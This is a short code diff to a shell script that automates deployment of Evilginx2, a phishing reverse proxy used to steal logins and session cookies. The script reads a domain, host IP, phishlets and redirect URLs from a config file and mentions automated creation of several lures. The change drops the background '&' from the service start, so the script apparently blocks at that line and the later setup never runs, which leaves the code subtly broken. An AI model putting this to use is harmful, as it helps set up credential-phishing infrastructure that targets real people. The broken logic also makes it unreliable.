@@ -5,8 +5,6 @@ setup_evilginx() {
     host_ip=$2
     redirect_url=$3
     default_phishlet=$4
-    # Start the Evilginx2 service in the background
-    /bin/evilginx -p /app/phishlets/ -developer -debug &
     
     # Wait for a specific log message that confirms the service is running
     while ! pgrep -x "evilginx" > /dev/null; do
@@ -189,6 +187,12 @@ default_phishlet=$(jq -r '.EvilGinx2.default_phishlet' "$config_file")
 default_redirect=$(jq -r '.EvilGinx2.default_redirect' "$config_file")
 opsgenie_api_key=$(jq -r '.Opsgenie_API_Key' "$config_file")
 
+#Make the needed shared subirectories
+mkdir -p /shared-data/EG2_DB /shared-data/fresh-data /shared-data/used-data
+
+# Start the Evilginx2 service in the background
+/bin/evilginx -p /app/phishlets/ -developer -debug
+
 # Check if any of the critical values are empty, "", or "none"
 if [[ -z "$domain_name" || "$domain_name" == "none" ]] || \
    [[ -z "$host_ip" || "$host_ip" == "none" ]] || \
@@ -197,7 +201,6 @@ if [[ -z "$domain_name" || "$domain_name" == "none" ]] || \
     exit 1
 fi
 #Setup EvilGinx2
-mkdir -p /shared-data/EG2_DB /shared-data/fresh-data /shared-data/used-data
 setup_evilginx $domain_name $host_ip $default_redirect $default_phishlet 
 
 # Automate multiple lure creation
